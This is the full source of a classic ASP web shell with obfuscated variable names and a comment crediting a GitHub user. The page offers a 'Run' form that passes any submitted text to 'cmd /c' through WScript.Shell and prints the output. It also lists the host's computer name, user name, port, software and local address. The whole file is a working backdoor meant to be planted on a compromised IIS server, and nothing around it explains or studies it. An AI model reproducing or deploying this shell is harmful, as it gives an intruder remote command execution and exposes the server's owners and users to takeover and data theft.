
<!--
Taken from github user t-e-n-n-c (without the dashes)
-->


<%
Set gdfgjsdflg = Server.CreateObject("WSCRIPT.SHELL")
Set gdfgjsdflgNet = Server.CreateObject("WSCRIPT.NETWORK")
Set dgvdfyv = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim dgfhfgbncvxq, ljklfhjbfgfhg
    Set dgfhfgbncvxq = CreateObject("WScript.Shell")
    Set ljklfhjbfgfhg = dgfhfgbncvxq.exec(thecommand)
    getCommandOutput = ljklfhjbfgfhg.StdOut.ReadAll
end Function
%>


<HTML><BODY>
<FORM action="" method="GET"><input type="text" name="cmd" size=45 value="<%= szCMD %>"><input type="submit" value="Run"></FORM>
<PRE>
<%= "\\" & gdfgjsdflgNet.ComputerName & "\" & gdfgjsdflgNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
</p>
<p>
<% szCMD = request("cmd")
werdfgsaasf = getCommandOutput("cmd /c" & szCMD)
Response.Write(werdfgsaasf)%>
</p>
<br>
</BODY></HTML>

